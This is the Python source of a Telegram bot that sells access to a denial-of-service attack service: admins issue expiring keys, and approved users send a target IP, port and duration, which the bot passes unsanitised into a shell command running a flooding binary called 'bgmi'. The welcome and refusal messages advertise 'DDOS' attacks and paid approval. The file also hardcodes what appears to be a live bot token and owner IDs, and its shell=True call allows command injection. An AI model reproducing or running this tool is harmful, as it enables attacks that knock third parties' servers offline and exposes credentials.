import telebot
import subprocess
import datetime
import os
import logging
import time
import random
import string
from pytz import timezone

# Configure logging for easier debugging
logging.basicConfig(filename='/home/ubuntu/bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Insert your Telegram bot token here
bot = telebot.TeleBot('6921680287:AAEL2ojcHgaUpOd5Gtq0R6XBtYEEiJW7pd0')

# Owner and admin user IDs
owner_id = "6281757332"
admin_ids = ["1095303717", "1095303717"]

# File to store allowed user IDs
USER_FILE = "users.txt"
KEYS_FILE = "keys.txt"  # File to store keys and expiration times
LOG_FILE = "bot_activity.log"  # Log file for activities

# Dictionary to store last attack time, credits, and redeemed keys
user_last_attack = {}
redeemed_keys = {}  # Store redeemed keys with user_id to check who redeemed them
keys = {}  # Store keys with expiration dates and users who redeemed them
allowed_user_ids = []  # Store list of allowed users

# Read allowed user IDs from a file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

allowed_user_ids = read_users()

# Read the keys and expiration times from the file
def read_keys():
    try:
        with open(KEYS_FILE, "r") as file:
            for line in file.readlines():
                line = line.strip()
                if not line:  # Skip empty lines
                    continue
                parts = line.split(' ')
                if len(parts) == 2:  # Ensure we have a key and expiration
                    key, expiration = parts
                    try:
                        keys[key] = {
                            "expiration": datetime.datetime.strptime(expiration, "%Y-%m-%d %H:%M:%S"),
                            "user": None  # Store user who redeemed the key
                        }
                    except ValueError:
                        logging.error(f"Skipping invalid expiration format in key: {line}")
    except FileNotFoundError:
        logging.warning(f"{KEYS_FILE} not found. Keys will be loaded empty.")
        
# Generate a formatted attack response
def start_attack_reply(message, target, port, duration):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    response = (
        f"🚀 **Attack Initiated!** 🚀\n\n"
        f"🔴 **Target IP:** {target}\n"
        f"🌵 **Target Port:** {port}\n"
        f"⏳ **Duration:** {duration} seconds`\n\n"
        f"⚡ **Attack in Progress...** ⚡"
    )
    bot.reply_to(message, response)

# Check cooldown
def check_cooldown(user_id):
    current_time = time.time()
    last_attack_time = user_last_attack.get(user_id, 0)
    wait_time = 240 - (current_time - last_attack_time)
    return wait_time

# Convert to IST
def convert_to_ist(timestamp):
    ist = timezone('Asia/Kolkata')
    return timestamp.astimezone(ist)

# Redeem key function
@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    
    if len(command) == 2:
        key = command[1]
        
        # Check if the key is valid and not expired
        if key in keys:
            expiration_time = keys[key]["expiration"]
            current_time = datetime.datetime.now()
            
            if expiration_time > current_time:
                if keys[key]["user"] is not None:
                    response = "❌ **This key has already been redeemed!**"
                else:
                    # Add the key to redeemed keys
                    keys[key]["user"] = user_id
                    # Add user to the allowed list
                    allowed_user_ids.append(user_id)
                    with open(USER_FILE, "a") as file:
                        file.write(f"{user_id}\n")
                    
                    response = f"✅ **Key redeemed successfully!**\nYou now have access to the bot."
                    logging.info(f"User {user_id} redeemed the key {key}.")
            else:
                response = "❌ **This key has expired!**"
        else:
            response = "❌ **Invalid key!**"
    else:
        response = "⚠️ **Usage:** /redeem <key>"
    
    bot.send_message(message.chat.id, response)

# Handle the /key generate command
@bot.message_handler(commands=['key'])
def generate_key(message):
    user_id = str(message.chat.id)
    if user_id == owner_id or user_id in admin_ids:
        command = message.text.split()
        
        if len(command) == 2 and command[1] == "generate":
            key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))  # Generate a 16-character key
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1)  # Default is 1 day from now
            keys[key] = {
                "expiration": expiration_date,
                "user": None  # No user redeemed yet
            }
            
            # Save the key and expiration time to the file
            with open(KEYS_FILE, "a") as file:
                file.write(f"{key} {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}\n")
            
            response = f"🗝️ **Key generated successfully!**\nYour key is: {key}\nIt will expire on: {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}"
        elif len(command) == 3 and command[1] == "generate" and command[2].endswith('day'):
            try:
                # Parse the number of days from the command (e.g., "1day")
                days = int(command[2].replace('day', ''))
                key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))  # Generate a 16-character key
                expiration_date = datetime.datetime.now() + datetime.timedelta(days=days)  # Expiration as per input
                keys[key] = {
                    "expiration": expiration_date,
                    "user": None  # No user redeemed yet
                }
                
                # Save the key and expiration time to the file
                with open(KEYS_FILE, "a") as file:
                    file.write(f"{key} {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}\n")
                
                response = f"🗝️ **Key generated successfully!**\nYour key is: `{key}` \nIt will expire on: {expiration_date.strftime('%Y-%m-%d %H:%M:%S')}"
            except ValueError:
                response = "⚠️ **Invalid duration format!** Please specify like `/key generate 1day`."
        else:
            response = "⚠️ **Usage:** /key generate <duration>"
    else:
        response = "❌ **You are not authorized to generate keys!**"
    
    bot.send_message(message.chat.id, response)
    
# Handle /keyblock command
@bot.message_handler(commands=['keyblock'])
def key_block(message):
    user_id = str(message.chat.id)
    
    # Ensure both the owner and admins can block a key
    if user_id == owner_id or user_id in admin_ids:
        command = message.text.split()
        
        if len(command) == 2:
            key_to_block = command[1]
            blocked_user = None
            
            # Find the user who redeemed the key
            for key, value in keys.items():
                if key == key_to_block:
                    blocked_user = value["user"]
                    break
            
            if blocked_user:
                # Remove the key from the keys dictionary
                del keys[key_to_block]
                
                # Remove the user from the allowed list
                if blocked_user in allowed_user_ids:
                    allowed_user_ids.remove(blocked_user)
                    # Update the user file
                    with open(USER_FILE, "w") as file:
                        for user in allowed_user_ids:
                            file.write(f"{user}\n")
                
                # Notify the admin/owner
                response = f"❌ **User {blocked_user} has been blocked.** Key {key_to_block} has been removed."
                logging.info(f"Key {key_to_block} blocked and user {blocked_user} removed.")
            else:
                response = "❌ **This key is not valid or hasn't been redeemed yet!**"
        else:
            response = "⚠️ **Usage:** /keyblock <key>"
    else:
        response = "❌ **You are not authorized to block keys.**"
    
    bot.send_message(message.chat.id, response)
        
# Handler for /start command
@bot.message_handler(commands=['start'])
def start(message):
    welcome_message = (
        "🎉 **Welcome to the DDOS Bot!** 🎉\n\n"
        "You're about to unlock powerful features, but before you can start, you'll need approval from an admin.\n\n"
        "To get started, simply reach out to an admin or the owner to gain access to the bot's full potential.\n\n"
        "🚀 **Excited to get started?** Contact an admin for approval and you'll be ready to go!\n"
        "👉 **Remember, only approved users can access the /attack command!**"
    )
    bot.send_message(message.chat.id, welcome_message)
    
# Handle /attack command
@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)

    if user_id in allowed_user_ids:
        wait_time = check_cooldown(user_id)

        if wait_time > 240:
            response = f"⏳ **Cooldown Active!**\nPlease wait {wait_time:.2f} seconds before initiating another attack."
        else:
            command = message.text.split()
            if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
                if not message.text.startswith('/'):
                    command = ['/attack'] + command  # Prepend '/attack' to the command list
                target, port, time_duration = command[1], int(command[2]), int(command[3])

                if time_duration > 240:
                    response = "❌ **Error:** Time interval must be less than 240 seconds."
                else:
                    user_last_attack[user_id] = time.time()
                    start_attack_reply(message, target, port, time_duration)
                    full_command = f"./bgmi {target} {port} {time_duration} 400"
                    subprocess.run(full_command, shell=True)

                    response = f"🎯 **Attack Finished!**\n**Target:** `{target}`\n**Port:** `{port}`\n**Duration:** `{time_duration} seconds`"
            else:
                response = "Please provide the attack in the format:**<HOST> <PORT> <TIME>"
    else:
        response = (
            "🚫 **Unauthorized Access!** 🚫\n\n"
            "Oops! It seems like you don't have permission to use the /attack command. To gain access and unleash the power of attacks, you can:\n\n"
            "👉 **Contact an Admin or the Owner for approval.**\n"
            "🌟 **Become a proud supporter and purchase approval.**\n"
            "🔑 **Chat with an admin now and level up your capabilities!**\n\n"
            "🚀 Ready to supercharge your experience? Take action and get ready for powerful attacks!"
        )
    bot.reply_to(message, response)

# Handle /myinfo command
@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        user_info = message.from_user
        username = user_info.username if user_info.username else user_info.first_name
        
        # Check if the user has redeemed a key and get the expiration time
        user_key = None
        expiration_time = None
        for key, value in keys.items():
            if value["user"] == user_id:
                user_key = key
                expiration_time = value["expiration"]
                break
        
        if user_key and expiration_time:
            # Convert to IST
            expiration_time_ist = convert_to_ist(expiration_time)
            response = (
                f"🔑 **Your Access Information**\n\n"
                f"👤 **Username:** @{username}\n"
                f"🆔 **User ID:** {user_id}\n"
                f"🗝️ **Key:** {user_key}\n"
                f"⏳ **Expiration Time:** {expiration_time_ist.strftime('%Y-%m-%d %H:%M:%S %Z%z')}\n"
                f"✅ **Access:** Granted\n"
            )
        else:
            response = (
                "🚫 **You don’t have access to the bot!**\n\n"
                "Please Contact to admin to gain access."
            )
    else:
        response = (
            "🚫 **Unauthorized Access!**\n\n"
            "You are not authorized to use /myinfo."
        )
    
    bot.send_message(message.chat.id, response)

# Handle /code command (for the owner to see all keys)
@bot.message_handler(commands=['allkeys'])
def view_all_keys(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        response = "🗝️ **Generated Keys and Their Expiration Times:**\n\n"
        for key, value in keys.items():
            expiration_time_ist = convert_to_ist(value["expiration"])
            response += (f"Key: `{key}` | Expiration: {expiration_time_ist.strftime('%Y-%m-%d %H:%M:%S %Z%z')}\n")
        
        bot.send_message(message.chat.id, response)
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to view the keys!**")

# Handle /approveuser command
@bot.message_handler(commands=['approveuser'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        
        if len(command) == 2:
            user_to_approve = command[1]
            if user_to_approve not in allowed_user_ids:
                allowed_user_ids.append(user_to_approve)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_approve}\n")
                bot.send_message(message.chat.id, f"✅ User {user_to_approve} has been approved.")
                logging.info(f"User {user_to_approve} approved by owner.")
            else:
                bot.send_message(message.chat.id, "❌ This user is already approved.")
        else:
            bot.send_message(message.chat.id, "⚠️ **Usage:** /approveuser <user_id>")
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to approve users.**")

# Handle /removeuser command
@bot.message_handler(commands=['removeuser'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                bot.send_message(message.chat.id, f"❌ User {user_to_remove} has been removed.")
                logging.info(f"User {user_to_remove} removed by owner.")
            else:
                bot.send_message(message.chat.id, "❌ This user is not in the allowed list.")
        else:
            bot.send_message(message.chat.id, "⚠️ **Usage:** /removeuser <user_id>")
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to remove users.**")

# Handle /broadcast command
@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split(maxsplit=1)
        
        if len(command) == 2:
            broadcast_message = command[1]
            for user in allowed_user_ids:
                try:
                    bot.send_message(user, broadcast_message)
                    logging.info(f"Sent broadcast to user {user}")
                except Exception as e:
                    logging.error(f"Error sending broadcast to {user}: {e}")
            bot.send_message(message.chat.id, f"✅ Broadcast sent to all approved users.")
        else:
            bot.send_message(message.chat.id, "⚠️ **Usage:** /broadcast <message>")
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to send broadcasts.**")

# Handle /allusers command
@bot.message_handler(commands=['allusers'])
def all_users(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        response = "👥 **List of All Approved Users:**\n\n"
        if allowed_user_ids:
            response += "\n".join(allowed_user_ids)
        else:
            response += "No approved users."
        bot.send_message(message.chat.id, response)
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to view all users.**")
                        
# Handle /logs command
@bot.message_handler(commands=['logs'])
def view_logs(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        with open(LOG_FILE, "r") as log_file:
            logs = log_file.readlines()
        
        response = "📜 **Bot Activity Logs:**\n\n"
        if logs:
            response += "".join(logs[-10:])  # Display last 10 log entries
        else:
            response += "No logs available."
        
        bot.send_message(message.chat.id, response)
    else:
        bot.send_message(message.chat.id, "❌ **You are not authorized to view logs.**")
        
# Main polling loop with automatic key expiry check every hour
def check_key_expirations():
    current_time = datetime.datetime.now()

    # Check for expired keys and remove access
    expired_keys = [key for key, value in keys.items() if value["expiration"] < current_time]

    for key in expired_keys:
        del keys[key]
        # Remove the user from allowed list if they used the expired key
        user_id = keys[key]["user"]
        if user_id in allowed_user_ids:
            allowed_user_ids.remove(user_id)
        logging.info(f"Expired key {key} has been removed.")

def start_polling():
    while True:
        try:
            # Start the bot polling in a separate thread to keep it responsive
            bot.polling(none_stop=True, interval=0)  # none_stop ensures it doesn't stop even if an exception occurs.
        except Exception as e:
            logging.error(f"An error occurred in polling: {e}")
            time.sleep(5)  # Wait for 5 seconds before retrying to handle errors gracefully

def check_expiry_periodically():
    while True:
        check_key_expirations()
        time.sleep(3600)  # Check every hour for expired keys

# Start polling and checking for key expirations in separate threads to run concurrently
if __name__ == "__main__":
    # Create separate threads for polling and checking key expirations
    import threading
    polling_thread = threading.Thread(target=start_polling)
    expiry_thread = threading.Thread(target=check_expiry_periodically)

    # Start both threads
    polling_thread.start()
    expiry_thread.start()

    # Join threads to keep the program running
    polling_thread.join()
    expiry_thread.join()
    